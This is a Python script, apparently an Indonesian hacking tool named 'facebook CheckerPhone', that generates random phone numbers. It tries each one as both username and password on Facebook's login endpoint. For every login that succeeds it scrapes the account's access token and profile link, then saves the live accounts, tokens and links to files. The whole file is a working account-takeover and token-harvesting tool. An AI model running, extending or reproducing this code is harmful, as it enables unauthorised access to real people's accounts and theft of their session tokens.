#Created : Alvins
#YouTube : Pangeran Alvins
#Github  : github.com/PangeranAlvins
import requests , bs4 , re
# from fake_useragent import UserAgent
import time , os , sys , random
from datetime import datetime




if sys.platform in ["linux","linux2"]:
	W = '\033[0m'
	G = '\033[32;1m'
	R = '\033[31;1m'
	
else:
	W = ''
	G = ''
	R = ''



print()
print(G + r'''
  __               _                 _
 / _|   Alvins    | |               | |
| |_ __ _  ___ ___| |__   ___   ___ | | __
|  _/ _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
| || (_| | (_|  __/ |_) | (_) | (_) |   <
|_| \__,_|\___\___|_.__/ \___/ \___/|_|\_\\
                    CheckerPhone v.01
 ''')
print()


def generate():
	global generatednum
	print(R + '[01] MEMBUAT ANGKA TELEPON')
	print(R + '[02] JUMBLAH NOMOR YANG DIINGINKAN')
	print(G + '[🔵] PILIH NOMOR :>> ' , end='')
	xinpt = int(input())

	stra = '01'



	num2 = ''

	nums = []


	for i in range(xinpt):
		num1 = str(random.randint(0,2))
		for i in range(8):
			x = random.randint(0,9)
			num2 += str(x)

		totalnum = stra + num1 + num2

		nums.append(totalnum)
		num2 = ''

	generatednum = len(nums)

	with open('phones.txt' , 'w') as filenum:
		for i in nums:
			filenum.write(i + '\n')

generate()

print('[✔️] DONE ... %s ANGKA PONSEL YANG DIHASILKAN' % (generatednum))
pattern = re.compile(r'access_token:"(EAAA\w+?)",')
print()
print(R + '[🔵] SILAKAN TULIS [ phones.txt ]')
print(G + '[🔵] TERSIMPAN :>> ' , end='')

inpt = input()
filephones = open(inpt , 'r')

phones = filephones.read().split('\n')

totalnum = len(phones)

filephones.close()

Live = []
Dead = []
access_token = []
links = []

print()

print(R + '[🔴] %s ANGKA AKAN DIPERIKSA' % (totalnum - 1))

for i in phones:
	time.sleep(.5)
	if not i.isdecimal():
		continue

	print(G + '[⏩] [%s/%s] CHECKING : ' % (phones.index(i) + 1, totalnum - 1) + W + '[ %s ] .... ' % (i) , end='' , flush=True)
	url = 'https://facebook.com/login.php?login_attempt=1'
	header1 = {'Host': 'www.facebook.com',
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36',
	'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	'Accept-Language': 'en-US,en;q=0.5',
	'Accept-Encoding': 'gzip, deflate',
	'Referer': 'https://www.facebook.com/login.php?login_attempt=1&lwv=110',
	'Cookie': r"_js_reg_fb_ref=https://facebook.com",
	'Connection': 'close',
	'Upgrade-Insecure-Requests': '1',
	'Content-Type': 'application/x-www-form-urlencoded',
	}

	email = i
	passw = i



	payload = 'email=%s&pass=%s' % (email , passw)

	session = requests.Session()
	session.cookies.clear()
	try:
		res0  = session.get('https://www.facebook.com/')
		res  = session.post('https://facebook.com/login.php', headers=header1, data=payload)
	

		if 'Log in to Facebook' in res.text:
			print(R + '[❌] MATI')
			Dead.append(i)
			continue

		else:
			print(G + '[✔️] AKTIF')
			Live.append(i)
			print(G + '[🔵] MENGEKSEKSI ACCESS TOKEN : ' , end='' , flush=True)
		
	except Exception as exc:
		print(R + '[❌] ERROR')
		continue

	# with open('face.html' , 'wb') as file:
	# 	for i in res.iter_content(100000):
	# 		file.write(i)

	# res2 = session.get('http://www.facebook.com/profile.php')

	parse = bs4.BeautifulSoup(res.text , 'lxml')

	elems = parse.select('a[accesskey="2"]')
	if elems == []:
		print(R + 'OOPS ACCOUNT TELAH TERKUNCI')

	else:

		x = elems[0].get('href')
		
		heder = res.headers
		res2 = session.get(x)
		search = pattern.search(res2.text)
		if search:
			access = search.group(1)
			print(W + access)
			access_token.append(access)
			print(G + '[🔵] ACCOUNT LINK : ' , W + x)
			links.append(x)
			print()
		else:
			print(R + '❌] ACCOUNT TELAH DIBLOKIR')



Name = str(datetime.now())
os.makedirs(os.path.join('OUTPUT', Name) , exist_ok=True)

os.chdir(os.path.join('OUTPUT',Name))

with open('Live.txt' , 'w') as file:
	for i in Live:
		file.write(i + '\n')

with open('Dead.txt' , 'w') as file:
	for i in Dead:
		file.write(i + '\n')

with open('access_tokens.txt' , 'w') as file:
	for i in access_token:
		file.write(i + '\n')


with open('accounts_links.txt' , 'w') as file:
	for i in links:
		file.write(i + '\n')

print(G +'[✔️] HASIL TELAH DISIMPAN DI FOLDER [%s] DI [KELUARKAN]' % (Name))
